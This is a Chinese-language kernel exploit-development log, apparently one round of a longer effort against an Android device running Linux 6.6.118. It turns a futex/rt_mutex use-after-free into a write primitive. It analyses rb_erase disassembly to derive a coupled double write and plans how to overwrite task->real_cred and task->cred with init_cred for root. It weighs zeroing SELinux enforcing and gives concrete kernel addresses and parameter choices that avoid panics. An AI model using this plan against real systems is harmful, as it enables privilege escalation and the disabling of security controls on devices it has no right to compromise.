# H177 — ★★★ 写原语真相：`rb_erase` 是**耦合双写**；`lock` 可放画布内；`wake_up_state` 是 `try_to_wake_up`★★★

> 结论一句话：**H176 §6/§7/§8 的写原语刻画全部作废。真实语义是「转置式耦合双写」（地址槽放地址、值槽放值），
> 而 `lock` 这个"必须在内核全局找全零区"的阻塞项（U1）**根本不存在** —— `lock` 就该放在我们自己的画布里。
> 且 `wake_up_state` 不是 `__wake_up(&p->pi_wq,...)`，是 `try_to_wake_up(p, state, 0)`，这让 `waiter->task` 的选值约束完全不同。**
>
> 本轮全程**未开火**，`boot_id abc61a92-7b66-4ccf-b8fe-26f70918cb30` 仍未消耗，`getenforce` 仍 `Enforcing`，uid 仍 2000。
> **全程零 adb 写操作。**

---

## 0. 置信度声明（四级，严格分开）

| # | 结论 | 置信度 | 依据（本轮实读） |
|---|---|---|---|
| C1 | `__rb_erase_augmented` 存在**不可回避的 `__rb_change_child` 连带写** | **汇编已证** | 源码 `rbtree_augmented.h:240-255` + **本机 `rb_erase@0xffffffc08003a9d4` 实反汇编 Case 1 全 12 条指令** |
| C2 | 连带写落点 = `*(V&~3 + 0x10)` 或 `*(V&~3 + 0x08)`，由 `*(V&~3)==&entry` 二选一 | **汇编已证** | 同上，`0x…a9f0: ldr x12,[x11,#0x10]!` + `0x…aa00: str x8,[x11]` |
| C3 | `V&~3==0`（`V∈{0,1,2,3}`）时连带写落 `*(lock+0x08)` | **汇编已证** | 同上，`0x…a9e8: b.eq` → `x11=x1(root)` → `0x…aa00: str x8,[x1]` |
| C4 | H176「stage8 直接 `task+0x818 = init_cred`」会写坏 `init_cred->uid` | **源码已证 + 汇编已证** | `rbtree_augmented.h:196-201` + `btf_offsets.txt:220-236`（`cred.uid@0x08`） |
| C5 | 正确写法是**转置式**：`V=目标地址`、`T=想要写的值` | **源码已证** | 同 C1/C4 |
| C6 | `[8] rt_mutex_enqueue → rb_add_cached` 会**二次写**目标地址，自我撤销 `[7]` 的零值 | **源码已证** | `rtmutex.c:465-469` + `rbtree.h:164-186` + `rbtree.h:59-66` |
| C7 | `selinux_state.enforcing` **不适合作为第一发目标** | **源码已证** | C6 的直接推论 |
| C8 | `[9]` `prerequeue_top_waiter != top_waiter` **会真的成立** ⇒ `wake_up_state` 执行 | **源码已证** | `rtmutex.c:917/935/960-962` + `rbtree.h:113`（`rb_insert_color_cached` 改写 `lock+0x10`） |
| C9 | `wake_up_state(p,s)` = `try_to_wake_up(p, s, 0)`，**不碰 `pi_wq`** | **汇编已证（本轮新读）** | `kernel/sched/core.c:4604-4607` + **`wake_up_state@0xffffffc08004f0c4` 实反汇编：`mov w2,wzr; bl try_to_wake_up`** |
| C10 | `try_to_wake_up` 对**已在运行态的 task**（`on_rq=1` 且 `ttwu_runnable`）会**零副作用返回** | **源码推断未实测** | `core.c:4348-4360`（`if (READ_ONCE(p->on_rq) && ttwu_runnable(p, wake_flags)) break;`）+ `4332-4335`（`state=0` ⇒ `ttwu_state_match` 返 0 ⇒ 先 break） |
| C11 | **U1 解除**：`lock = &waiter + 0x70`（画布内）合法 | **源码已证** | `lock` 值来自 `waiter->lock`（UAF 读，我方给）；画布可写/独占/可清零 |
| C12 | H176 的「红利 #3（prerequeue≡top ⇒ 不 wake）」**反转** | **源码已证** | C8 |
| C13 | `lockdep_assert_held` / `lockdep_assert` 在本机**空展开** | **config 已证 + 源码已证** | `mey_config.txt:7648` `# CONFIG_PROVE_LOCKING is not set` ⇒ `lockdep.h:427-430` `#define lockdep_assert(c) do{}while(0)` |

---

## 1. ★★★ 本轮头号发现：`__rb_erase_augmented` 的**连带写**——H176 完全漏了 ★★★

### 1.1 H176 的错误刻画

H176 §6.2 断言两条路径都是「单写 + `rebalance=NULL` 干净退出」，并把写原语描述为：

> 「**任意值 → 任意地址**」：写址 `T` 我方给、写值 `V` 我方给。

**「干净退出」这半对，「单写」这半错。**

### 1.2 真实代码（本轮实读 `rbtree_augmented.h:223-256`）

```c
static __always_inline struct rb_node *
__rb_erase_augmented(struct rb_node *node, struct rb_root *root,
		     const struct rb_augment_callbacks *augment)
{
	struct rb_node *child = node->rb_right;      // :227  = waiter+0x08
	struct rb_node *tmp   = node->rb_left;       // :228  = waiter+0x10
	struct rb_node *parent, *rebalance;
	unsigned long pc;

	if (!tmp) {                                  // :232  Case 1: rb_left == 0
		pc     = node->__rb_parent_color;       // :240  = V
		parent = __rb_parent(pc);               // :241  ★★★ parent = V & ~3
		__rb_change_child(node, child, parent, root);   // :242  ★★★ 连带写
		if (child) {
			child->__rb_parent_color = pc;      // :244  主写 *(T) = V
			rebalance = NULL;                    // :245
		} else
			rebalance = __rb_is_black(pc) ? parent : NULL;
		tmp = parent;
	} else if (!child) {                         // :249  Case 1': rb_left!=0 && rb_right==0
		tmp->__rb_parent_color = pc = node->__rb_parent_color;  // :251  主写 *(T) = V
		parent = __rb_parent(pc);                             // :252  = V & ~3
		__rb_change_child(node, tmp, parent, root);           // :253  ★★★ 连带写
		rebalance = NULL;                                      // :254
		tmp = parent;
	} else { /* Case 2/3：两子皆非空，复杂，不可用 */ }
	augment->propagate(tmp, NULL);                // :321  dummy = 空函数
	return rebalance;
}
```

`__rb_change_child`（`:194-205`）：
```c
static inline void
__rb_change_child(struct rb_node *old, struct rb_node *new,
		  struct rb_node *parent, struct rb_root *root)
{
	if (parent) {
		if (parent->rb_left == old)
			WRITE_ONCE(parent->rb_left, new);     // 写 *(parent+0x10) = new
		else
			WRITE_ONCE(parent->rb_right, new);    // 写 *(parent+0x08) = new
	} else
		WRITE_ONCE(root->rb_node, new);            // 写 *(lock+0x08) = new
}
```

### 1.3 ★★★ 本机汇编铁证（`rb_erase@0xffffffc08003a9d4`，本轮实反汇编）

```
;; 入口：x0 = node（= &waiter->tree.entry），x1 = root（= &lock->waiters.rb_node）
0xffffffc08003a9d4:  ldp      x8, x10, [x0, #8]      ; x8=[+8]=rb_right(child)  x10=[+0x10]=rb_left(tmp)
0xffffffc08003a9d8:  cbnz     x10, #0x…aa18         ; ★ if (tmp /*rb_left*/) → Case 1'
0xffffffc08003a9dc:  ldr      x9, [x0]             ; x9 = node->__rb_parent_color = V
0xffffffc08003a9e0:  mov      x11, x1              ; x11 = root           ← V&~3==0 时的落点
0xffffffc08003a9e4:  ands     x10, x9, #-4         ; x10 = V & ~3  = parent
0xffffffc08003a9e8:  b.eq     #0x…aa00             ; ★ if (parent == 0) 用 root
0xffffffc08003a9ec:  mov      x11, x10             ; x11 = parent
0xffffffc08003a9f0:  ldr      x12, [x11, #0x10]!    ; ★★★ x11 = parent+0x10；读 *(V&~3 + 0x10)
0xffffffc08003a9f4:  sub      x13, x11, #8          ;     x13 = parent+0x08
0xffffffc08003a9f8:  cmp      x12, x0              ; ★ 比较 *(parent+0x10) == node ?
0xffffffc08003a9fc:  csel     x11, x11, x13, eq    ; ★ equal⇒x11=parent+0x10；ne⇒x11=parent+0x08
0xffffffc08003aa00:  str      x8, [x11]            ; ★★★ 连带写落地：*(V&~3+0x10 或 +0x08) = rb_right
0xffffffc08003aa04:  cbnz     x8, #0x…aa10         ; if (child)
0xffffffc08003aa08:  tbnz     w9, #0, #0x…aa78      ; if (V & 1) → rebalance=NULL → ret
0xffffffc08003aa0c:  ret
0xffffffc08003aa10:  str      x9, [x8]             ; ★★★ 主写：*(rb_right) = V
0xffffffc08003aa14:  ret
```

★★ **汇编逐条对上源码，且给出了源码看不出的两个精度提升**：
1. 连带写的落点是 **`(V&~3) + 0x10` 或 `(V&~3) + 0x08`**，不是笼统的「`V&~3` 或 `+8`」；
2. 二选一的判据是 **`*(V&~3 + 0x10) == &entry`**（即 `parent->rb_left == old`），而**不是**我上一轮猜的 `*(V&~3) == &entry`。

Case 1'（`rb_left != 0 && rb_right == 0`，`:249-255`）在汇编里是 `0x…ab04` 起：
```
0xffffffc08003ab04:  ldr      x9, [x0]             ; pc = V
0xffffffc08003ab08:  ands     x8, x9, #-4          ; parent = V & ~3
0xffffffc08003ab0c:  str      x9, [x10]           ; ★★★ 主写：*(rb_left) = V
0xffffffc08003ab10:  b.eq     #0x…ac0c             ; if (parent==0)
0xffffffc08003ab14:  ldr      x9, [x8, #0x10]
0xffffffc08003ab18:  cmp      x9, x0
0xffffffc08003ab1c:  b.ne     #0x…ac8c
0xffffffc08003ab20:  str      x10, [x8, #0x10]     ; ★★★ 连带写：*(parent+0x10) = rb_left
0xffffffc08003ab24:  ret
```
⇒ **Case 1' 也一样有连带写。H176 说的「两条路径都干净」中的「干净」只指 `rebalance=NULL`，不代表只有一次写。**

---

## 2. 耦合双写的真值表（本轮核心产出）

记 `N = &waiter->tree.entry`，`E = &waiter->tree.entry`（同一地址，下表用 `N`），`R = lock + 0x08`（root）。

| 路径 | 槽位设置 | **写 #1（主写）** | **写 #2（连带写）** | `rebalance` |
|---|---|---|---|---|
| **A1** `rb_left=0, rb_right=T≠0`，`V&~3≠0`，`*(V&~3+0x10)==N` | `pc=V`, `left=0`, `right=T` | `*(T) = V`（`:244` / `aa10`） | `*(V&~3+0x10) = T`（`aa00`） | `NULL` ✔ |
| **A2** 同上但 `*(V&~3+0x10)!=N` | 同 A1 | `*(T) = V` | **`*(V&~3+0x08) = T`** ← 落 +8 | `NULL` ✔ |
| **A3** 同上但 `V&~3==0`（`V∈{0,1,2,3}`） | 同 A1 | `*(T) = V` | `*(lock+0x08) = T`（自伤 fake lock） | `NULL` ✔ |
| **B1** `rb_left=T≠0, rb_right=0`，`V&~3≠0`，`*(V&~3+0x10)==N` | `pc=V`, `left=T`, `right=0` | `*(T) = V`（`:251` / `ab0c`） | `*(V&~3+0x10) = T`（`ab20`） | `NULL` ✔ |
| **B2** 同上但 `*(V&~3+0x10)!=N` | 同 B1 | `*(T) = V` | **`*(V&~3+0x08) = T`** | `NULL` ✔ |
| **B3** 同上但 `V&~3==0` | 同 B1 | `*(T) = V` | `*(lock+0x08) = T` | `NULL` ✔ |
| **C** `rb_left≠0 && rb_right≠0` | — | 走 Case 2/3，`augment->copy/propagate` 介入 | 多处 | **不可控，不可用** |

★★ **三个可利用的结论**：

1. **写原语是"转置式"（swap-like）双写，不是单写。**
   槽位语义：`parent_color` 槽放的是**写值 V**，但内核把它**当父节点指针解引用**；`rb_right`/`rb_left` 槽放的是**写地址 T**，它才是主写落点。
2. **想让连带写无害，有三条路**：
   - `V&~3 == 0` ⇒ 连带写落 `lock+0x08`（自伤 fake lock）。**代价：只能写 0/1/2/3 这四个小值。**
   - `V&~3` 指向**画布内某个槽位** ⇒ 连带写落画布内，完全无害。**代价：`V` 本身必须是画布（内核栈）地址，不能是 `init_cred` 这类内核全局。**
   - ★ **让连带写变成我们需要的第二写**（见 §3）。
3. **A3/B3（`V∈{0,1,2,3}`）自伤 `lock+0x08` 这件事，后面 §5 会看到它被 `[8] rb_add_cached` 二次利用变成"自我撤销"，是第一发的大忌。**

---

## 3. ★★★ H176 §8「stage8 直接写」会写坏 `init_cred->uid` —— 必须改成转置式 ★★★

### 3.1 H176 的原始写法（**作废**）

```
want:  *(task+0x818) = init_cred
H176:  V = init_cred  (放 parent_color 槽)   T = task+0x818  (放 rb_right 槽)
```

### 3.2 为什么作废（本轮实算）

`V = init_cred = 0xffffffc082190790`（`mey_6.6.118.kallsyms.txt` 实读）⇒ `V&~3 = 0xffffffc082190790`（本身 16 字节对齐）⇒ 走 A2（`*(V&~3+0x10) != N`，因为那里是 `cred.suid@0x10` 不可能等于栈地址）⇒

```
连带写 = *(0xffffffc082190790 + 0x08) = T
       = init_cred->uid@0x08 = 0xffffffc081xxxxxx     ← ★★ uid 被写成野值
       （同一个 8 字节写还覆盖 gid@0x0c）
```

`struct cred` BTF（`btf_offsets.txt:220-236`，size=0xb8）：
| 字段 | off |
|---|---|
| `usage` | 0x00 |
| **`uid`** | **0x08** |
| `gid` | 0x0c |

★ ⇒ **一旦 `task->cred = &init_cred`，`getuid()` 不可能是 0（判据失败），且 init(PID 1) 失去 root ⇒ 软砖。**
★ 这是 **H176 §8 会导致的最坏结果**：不是打不进去，是打进去之后系统半死。

### 3.3 ★ 正确写法：转置式（地址进 `parent_color` 槽，值进 `rb_right` 槽）

```
want:  *(task+0x818) = init_cred
解法:  V = task+0x818   (放 parent_color 槽 → 连带写的落点)
       T = init_cred    (放 rb_right 槽     → 主写的值)
```

验算（走 A2）：
| 写 | 落点 | 值 | 判定 |
|---|---|---|---|
| 写 #2（连带） | `*(V&~3 + 0x08)` = `*(task+0x818 + 0x08)` | `T = init_cred` | ★★ **这就是我们的目标写**（`+0x818` 而非 `+0x820`，需按对齐核对） |
| 写 #1（主写） | `*(T)` = `*(init_cred + 0x00)` | `V = task+0x818` | 只碰 `cred.usage@0x00`（4B）+ 4B padding ⇒ **`uid@0x08` 完好** ✔ |

★ **前提条件（三条，缺一不可）**：
1. **`T ≠ 0`**。若 `T == 0`，写 #1 = `*(0) = V` ⇒ NULL 解引用 panic。
   ⇒ **不能用 `V=0/T=0` 那套同时做 cred 写。**
2. `*(task+0x818 + 0x08) != &entry`。`task+0x820 = task->cred` 指向一个 `kmalloc` 的 `cred`（栈外），几乎不可能等于栈地址 ⇒ **自然满足**。
   ⚠️ 但若 `V&~3` 落在**栈上**且 `+0x10` 处恰好是我们画布的 `&entry`（我们能人为构造），那就走 A1 ⇒ 落 `+0x10` ⇒ **偏移差 8 字节，写到 `task+0x820`（`cred` 而非 `real_cred`）**。两发两 boot 的方案里这只会**顺序错位**，不致命，但必须记录。
3. `V&~3 ≠ 0`（`task+0x818` 显然非 0）✔ 且 `V` 的低 2 位（color）影响 `rebalance`：
   - A1/A2 走 `child != 0` 分支 ⇒ `rebalance = NULL` **与 color 无关** ✔
   - 这是选 A1/A2（`rb_right ≠ 0`）而非 A3 的又一个理由。

### 3.4 两发两 boot（`real_cred` 与 `cred`）

| 发 | 目标 | `V`（`parent_color`） | `T`（`rb_right`） | 连带写落点 | 主写落点 |
|---|---|---|---|---|---|
| 8a | `task->real_cred` | `task+0x818` | `init_cred` | **`*(task+0x818) = init_cred`** ✔ | `*(init_cred+0x00) = task+0x818`（碰 `usage`+pad，`uid` 完好） |
| 8b | `task->cred` | `task+0x820` | `init_cred` | **`*(task+0x820) = init_cred`** ✔ | 同上（同一个 `init_cred+0x00`） |

⚠️ **8a 的连带写落点是 `V&~3 + 0x08`**：`task+0x818` 若 8 字节对齐则 `V&~3 == task+0x818`，落点 `task+0x820`！⇒ **会先一步把 `cred` 也写掉。**
★★ **这一点必须实测确认对齐**：`task_struct` 是 `RANDSTRUCT`/缓存对齐，`+0x818` 的低 3 位不确定。
- 若 `task+0x818 ≡ 0 (mod 8)` ⇒ `V&~3+0x08 = task+0x820` ⇒ **8a 一发同时写 `real_cred` 和 `cred`** ⇒ **一发搞定，两发可省！**
- 若 `task+0x818 ≡ 4 (mod 8)` ⇒ `V&~3 = task+0x814`，落点 `task+0x81c` ⇒ **落在 `real_cred` 内部（跨 `+0x81c..+0x823`）⇒ 破坏** ✗
⇒ **stage8 前必须先确定 `task` 的绝对地址与低 3 位。**（见 §8 U5）

---

## 4. ★★★ `[8] rt_mutex_enqueue → rb_add_cached` 会**二次写**目标，自我撤销第一发 ★★★

这是 H176 完全没预见的一环。

### 4.1 `[8]` 的写入序列（本轮实读）

`rtmutex.c:935` → `rt_mutex_enqueue`（`rtmutex.c:465-469`）：
```c
static __always_inline void
rt_mutex_enqueue(struct rt_mutex_base *lock, struct rt_mutex_waiter *waiter)
{
	lockdep_assert_held(&lock->wait_lock);
	rb_add_cached(&waiter->tree.entry, &lock->waiters, __waiter_less);
}
```

`rbtree.h:164-186` `rb_add_cached`：
```c
struct rb_node **link = &tree->rb_root.rb_node;      // = &lock->waiters.rb_node = lock+0x08
struct rb_node *parent = NULL;
bool leftmost = true;
while (*link) {                                       // ★ 读 *(lock+0x08)
	parent = *link;
	if (less(node, parent)) { link = &parent->rb_left; }
	else { link = &parent->rb_right; leftmost = false; }
}
rb_link_node(node, parent, link);                     // ★ 写 *link = node
rb_insert_color_cached(node, tree, leftmost);         // ★ if (leftmost) tree->rb_leftmost = node
```

`rbtree.h:59-66` `rb_link_node`：
```c
	node->__rb_parent_color = (unsigned long)parent;
	node->rb_left = node->rb_right = NULL;
	*rb_link = node;                                    // ★★★ 写 *(lock+0x08) = &entry
```

`rbtree.h:108-115` `rb_insert_color_cached`：
```c
	if (leftmost)
		root->rb_leftmost = node;                       // ★★★ 写 *(lock+0x10) = &entry
```

### 4.2 ★★ `selinux_state.enforcing` 因此**不适合作为第一发目标**

`selinux_state` BTF（`btf_offsets.txt:252-261`，size=0x80）：`enforcing@0x0000`（`int`，1 字节）。
基址 `0x23ba418`（MEY-TECH 常数）⇒ `enforcing` 绝对地址 `0xffffffc0823ba418`。

H176 风格的「零值第一发」：
```
V = 0                (放 parent_color 槽)
T = 0xffffffc0823ba418  (放 rb_right 槽)
```
| 步 | 发生什么 | 结果 |
|---|---|---|
| `[7]` 主写 `:244` | `*(T) = V` = `*(0x…418) = 0` | ✔ **`enforcing = 0` ⇒ Permissive** |
| `[7]` 连带写 `:242` | `V&~3 == 0` ⇒ `*(lock+0x08) = T` | `lock+0x08` 被塞进野地址 `0x…418` |
| `[8]` `rb_add_cached` | `link = &lock+0x08`；`*(lock+0x08) = 0x…418 ≠ 0` ⇒ **进 while 循环** | ⚠️ 把 `selinux_state` 当 `rb_node` 读 |
| | `parent = 0x…418`；调 `__waiter_less(node, parent)` | 解引用 `0x…418 + 0x18/0x20`（`selinux_state` 的 `policycap`/`status_page` 区域） |
| | 若 `less()` 返 0 ⇒ `link = &parent->rb_right` = `0x…420`；再判 `*link` | 继续在 `selinux_state` 里穿行 |
| | `rb_link_node(node, parent, link)` | **`*(0x…418 或 0x…420) = &entry`** ⇒ **我们的零值被覆盖！** |
| | `rb_insert_color_cached(..., leftmost)` | 可能写 `*(lock+0x10)` |

★★ ⇒ **`enforcing = 0` 被 `[8]` 自我撤销。H176 §8 的「第一发打 SELinux」方案不成立。**

### 4.3 `[8]` 的两种结局（`lock+0x08` 初值决定）

| `lock+0x08` 初值 | `rb_add_cached` 行为 | 后果 |
|---|---|---|
| **0** | `while(*link)` 零次迭代 ⇒ `parent=NULL`、`leftmost=true` ⇒ `rb_link_node(node,NULL,&lock+0x08)`：写 `lock+0x08 = &entry`；`rb_insert_color_cached`：`lock+0x10 = &entry` | ★ **单节点插入，零重平衡，副作用全在画布内** |
| **≠ 0**（被 A3/B3 连带写污染） | 进入 while 循环 | ★★ **把该地址当 `rb_node` 遍历 ⇒ 野值必崩 / 或覆盖目标** |

⇒ ★ **铁律：`[7]` 的连带写绝不能污染 `lock+0x08`。** 即 **第一发必须走 A1/A2/B1/B2（`V&~3 ≠ 0`），不能走 A3/B3。**

---

## 5. ★★★ U1：`lock` 放画布内的方案**被自我否证**；U1 已由 H178 另行解除 ★★★

> ⚠️⚠️ **本节 5.1–5.4 的结论（"`lock` 放画布内 ⇒ U1 解除"）在写盘后被自我否证，勿引用。**
> **否证理由见 §5.5。U1 的正确解法见 H178：`lock = 0xffffffc082136048`（`.data..percpu` 空洞）。**
> **保留 5.1–5.4 原文仅为记录推理链；§5.5 的否证优先。**

### 5.1 H176 为什么卡在这

H176 §7 要求 `lock = L` 是一块**可写、独占、且 `+0x00/+0x08/+0x10/+0x18` 四个 qword 全 0** 的内核地址。
它排除了：
- `pi_state->pi_mutex` —— 真实、有 owner、有 waiters ⇒ 不可用
- `task+0x810`（`ptracer_cred`）—— 因为 `lock+0x08 = task+0x818 = real_cred ≠ 0` ⇒ `[8]` 会崩
⇒ **结论："必须扫描 BTF 找一块内核全零区"——被列为阻塞项 U1。**

### 5.2 ★ 它本来就在画布里

回看 `lock` 的来源：`rtmutex.c:820` `lock = waiter->lock;`
而 `waiter` = `task->pi_blocked_on` 是**我方通过画布指定的悬垂指针**（`rtmutex.c:722`），
`waiter->lock` 是**画布内的一个 8 字节槽**（waiter `+0x58` = 画布 `+0xc8` = `v12.d[1]`，H175 机器重算表）。

⇒ ★★★ **`lock` 的值完全由我方通过画布指定。它可以指向画布自身的任何一个槽位。**

画布就是 W 的内核栈（H175 已证：`画布基 = SP0-0x280`、`waiter 基 = SP0-0x210`，均实读自 `rt_sigreturn` / `futex_wait_requeue_pi`），
**可写（内核栈）、独占（只有 W 在用）、可用 vreg 精确清零**。

### 5.3 布局（本轮算，与 H175 画布几何对齐）

```
画布区 = [SP0-0x280, SP0-0x80]     = 0x200 字节（已证可写）

  SP0-0x280 ┌──────────────────────────────┐
            │  （前置区，H175 已用）        │
  SP0-0x210 ├──────────────────────────────┤  waiter 基（size=0x70）
            │  tree   @+0x00  (16B)         │  ← v7 = {parent_color=V, rb_right=T}
            │  pi_tree@+0x28  (40B)         │
            │  task   @+0x50                 │  ← v12.d[0]
            │  lock   @+0x58                 │  ← v12.d[1] = L
            │  wake_state@+0x60              │  ← v13.d[0]
            │  ww_ctx @+0x68                 │  ← v13.d[1]
  SP0-0x1a0 ├──────────────────────────────┤  ★ fake lock = &waiter + 0x70
            │  wait_lock    @+0x00  = 0      │  ← [5] trylock 写 1，[9] unlock 写回 0
            │  (pad)        @+0x04           │
            │  waiters.rb_node@+0x08 = 0     │  ← ★ 必须 0（[8] 单节点插入的前提，§4.3）
            │  waiters.rb_leftmost@+0x10= 0  │  ← [8] 会改成 &entry
            │  owner        @+0x18 = 0       │  ← ★ 必须 0（[9] 命中 owner==0 出口）
  SP0-0x180 ├──────────────────────────────┤
            │  （余量 0x100 字节，充裕）      │
  SP0-0x080 └──────────────────────────────┘
```

★ **`waiter` 14 个字段全在 `[SP0-0x280, SP0-0x080]` 内**（H175 已证），fake lock 的 0x20 字节也全在内 ⇒ **总占用 0x1b0 < 0x200，空间充裕。**

### 5.4 附带红利：所有"自伤"路径全部被关进画布

| 机制 | 落点 | 是否在画布内 |
|---|---|---|
| `[5]` trylock 写 1 / `[9]` unlock 写回 0 | `lock+0x00` | ✔ |
| `[7]` 连带写（A3/B3：`V&~3==0`） | `lock+0x08` | ✔ |
| `[7]` 连带写（A1/A2/B1/B2：`V&~3` 指画布） | `V&~3 + 0x08/0x10` | ✔（若 `V&~3` 指画布槽） |
| `[8]` `rb_link_node` | `lock+0x08` | ✔ |
| `[8]` `rb_insert_color_cached` | `lock+0x10` | ✔ |
| `[9]` unlock | `lock+0x00` | ✔ |
| `RB_CLEAR_NODE`（`dequeue` 末尾） | `waiter+0x00` | ✔ |
| `waiter_update_prio` | `waiter+0x18/0x20` | ✔ |

⇒ ★★ **U1 从"需要找到一块内核全零区"变成"在我们自己的画布里划 32 字节"。零内核全局地址依赖。**

### 5.5 ★★★ 自我否证：画布方案**不可行**（写盘后补，优先于 5.1–5.4）

**否证理由（一句话）**：要让 `lock` 指向画布内的 `SP0-0x1a0`，我必须在 userspace 侧把
`v12.d[1]` 填成 **`SP0-0x1a0` 这个绝对地址**；而 **`SP0`（内核栈基）我方无读原语**
（H138 已判死 SROP / `pt_regs` 双向闭合），所以这个绝对地址**算不出来**。

| 环节 | 需要什么 | 我方有吗 |
|---|---|---|
| `waiter->lock` 的值 | 任意常量 ✔ | 有（`fmov d12, x14` 直接填） |
| 画布内槽的绝对地址 | `SP0 - 0x1a0` | ❌ **无读原语，`SP0` 不可得** |
| 绕过 `SP0` 的办法 | 侧信道读栈指针 | ❌ H138 已逐一判死 |

⇒ **"lock 放画布内"并没有消除对内核全局地址的依赖，只是把依赖从「找一个全零区」
换成了「读出栈指针」。后者更难。U1 未被 5.1–5.4 解除。**

**§5.4 的红利表仍部分成立**：表中「`[7]` 连带写 A3/B3 → `lock+0x08`」这一条**与
`lock` 的位置无关，永远必须避免**（铁律保留，见 §4.3）。
其余各行（`[8]`/`[9]`/trylock 的落点随 `lock` 走）依然正确，只是 `lock` 不在画布里。

**正确的解法方向**：找一个**常量已知的内核全零区**。⇒ H178 用 BTF DATASEC 的权威
`st_size` 扫 `.data..percpu` 段空洞，得到 28 个候选，选定
**`LOCK = 0xffffffc082136048`**（0x38 字节，Image 内实测全零、无 kallsyms 符号、
同 4K 页内无其他符号、左右邻距 ≥ 0x8）。详见 H178 报告。

---

## 6. ★★★ `[9]` 的 `wake_up_state` 闸门**会触发**（H176 红利 #3 反转）★★

### 6.1 H176 的判断（**作废**）

> 「`prerequeue_top_waiter` 与 `top_waiter` 同址 ⇒ `:961` 恒等 ⇒ 不执行 `wake_up_state`。」

### 6.2 真实代码（本轮实读 `rtmutex.c:915-965`）

```c
	prerequeue_top_waiter = rt_mutex_top_waiter(lock);   // :917  读 lock+0x10（此时为 0）→ NULL
	/* [7] Requeue the waiter in the lock waiter tree. */
	rt_mutex_dequeue(lock, waiter);                      // :920
	waiter_update_prio(waiter, task);                    // :933
	rt_mutex_enqueue(lock, waiter);                      // :935  ★ rb_insert_color_cached 改写 lock+0x10
	...
	if (!rt_mutex_owner(lock)) {                         // :954  读 lock+0x18
		top_waiter = rt_mutex_top_waiter(lock);        // :960  读 lock+0x10（现在 = &entry）→ &waiter
		if (prerequeue_top_waiter != top_waiter)      // :961  NULL != &waiter  ★★ 成立
			wake_up_state(top_waiter->task, top_waiter->wake_state);   // :962
		raw_spin_unlock_irq(&lock->wait_lock);         // :963
		return 0;                                       // :964
	}
```

`rt_mutex_top_waiter`（`rtmutex_common.h:128-140`）读的是 `lock->waiters.rb_leftmost`（`lock+0x10`），**两次读之间 `[8]` 把它改了**。

★ 证据链：
| 步 | `lock+0x10` 的值 | 来源 |
|---|---|---|
| `:917` `prerequeue_top_waiter` | `0` ⇒ `rt_mutex_top_waiter` 返 `NULL` | 画布清零 |
| `:935` `[8] rb_add_cached` | **`&entry`** | `rbtree.h:113` `if (leftmost) root->rb_leftmost = node;` |
| `:960` `top_waiter` | `&entry` ⇒ `rb_entry` ⇒ `&waiter` | — |

⇒ ★★ **`:961` 的 `!=` 成立，`wake_up_state(&waiter->task, waiter->wake_state)` 一定执行。**
⇒ **`waiter->task` 不是"可填 0 的可选项"，而是硬约束。**

★ 与 H142 实测吻合：`h142_cve43499_uaf_hit.md` §2 的 `reason [null_pointer]` panic，
正是 `waiter->task = 0` ⇒ `wake_up_state(NULL, 0)` ⇒ NULL 解引用。

### 6.3 ★★★ 本轮新纠正：`wake_up_state` **不是** `__wake_up(&p->pi_wq, ...)`

我上一轮记的是"`wake_up_state` 内部会 `__wake_up(&tsk->pi_wq, ...)`，对空 waitqueue 无副作用"。
**错。** `kernel/sched/core.c:4604-4607`：
```c
int wake_up_state(struct task_struct *p, unsigned int state)
{
	return try_to_wake_up(p, state, 0);
}
EXPORT_SYMBOL(wake_up_state);
```

★★ 汇编铁证（`wake_up_state@0xffffffc08004f0c4`，本轮实反汇编，符号来自 `mey_6.6.118.kallsyms.txt`）：
```
0xffffffc08004f0c4:  paciasp
0xffffffc08004f0c8:  stp      x29, x30, [sp, #-0x10]!
0xffffffc08004f0cc:  mov      x29, sp
0xffffffc08004f0d0:  mov      w2, wzr            ; ★ wake_flags = 0
0xffffffc08004f0d4:  bl       #0xffffffc08016736c   ; ★ try_to_wake_up(p, state, 0)
0xffffffc08004f0d8:  ldp      x29, x30, [sp], #0x10
0xffffffc08004f0dc:  autiasp
0xffffffc08004f0e0:  ret
```
⇒ **`wake_up_state` 是个 4 指令 thunk，`pi_wq` 根本没出现在代码里。**

### 6.4 `try_to_wake_up(p, 0, 0)` 的早退门（本轮实读 `core.c:4315-4360`）

```c
int try_to_wake_up(struct task_struct *p, unsigned int state, int wake_flags)
{
	...
	if (p == current) { ... goto out; }

	scoped_guard (raw_spinlock_irqsave, &p->pi_lock) {   // ★ 无条件对 p->pi_lock 加锁！
		smp_mb__after_spinlock();
		if (!ttwu_state_match(p, state, &success))
			break;                                    // ★★ 早退门 #1
		trace_sched_waking(p);
		smp_rmb();
		if (READ_ONCE(p->on_rq) && ttwu_runnable(p, wake_flags))
			break;                                    // ★★ 早退门 #2（零副作用）
		...
```

`ttwu_state_match` → `__task_state_match`（`core.c:2297-2306`）：
```c
int __task_state_match(struct task_struct *p, unsigned int state)
{
	if (READ_ONCE(p->__state) & state) return 1;
	if (READ_ONCE(p->saved_state) & state) return -1;
	return 0;
}
```

★★ **`wake_state = 0` ⇒ `state = 0` ⇒ `p->__state & 0 == 0` 且 `p->saved_state & 0 == 0` ⇒ 返 0 ⇒ `match = 0` ⇒ `ttwu_state_match` 返 `false` ⇒ 命中早退门 #1，`break`。**

⇒ ★★★ **只需保证 `waiter->task` 指向一个「`pi_lock` 可读、字段可读」的真实 `task_struct`，且 `wake_state = 0`，则 `try_to_wake_up` 只会：加 `p->pi_lock` → 读 2 个字段 → 解锁 → 返回 0。零副作用、零 enqueue、零 IPI。**

### 6.5 `waiter->task` 的选值（三条约束，按优先级）

| 约束 | 要求 | 候选 |
|---|---|---|
| **硬** | `p != NULL`（否则 `raw_spinlock_irqsave(&p->pi_lock)` 解引用 `0x90c` ⇒ panic） | — |
| **硬** | `p->pi_lock`（`+0x90c`）与 `p->__state`/`p->saved_state` 可读 | 任何真实 task |
| **软** | 最小化副作用 | **`&init_task`（`0xffffffc08217e280`，kallsyms 实读）** |
| **备** | 若担心 `init_task` 被唤醒 | 任意 `pid_alive` 且 runnable 的 task |

★★ **首选 `waiter->task = &init_task`**：
- `init_task` 是**常驻内核线程**，不是 `current`（我们在 shell 进程里）⇒ 走 `scoped_guard(raw_spinlock_irqsave, &p->pi_lock)` 分支；
- 但 `wake_state = 0` ⇒ 早退门 #1 立即命中 ⇒ **`ttwu_queue` / `select_task_rq` / `set_task_cpu` / `psi_ttwu_dequeue` / IPI 全部不执行**；
- `init_task.pi_lock` 加解锁是净零（原本就是 0，unlock 写回 0）。

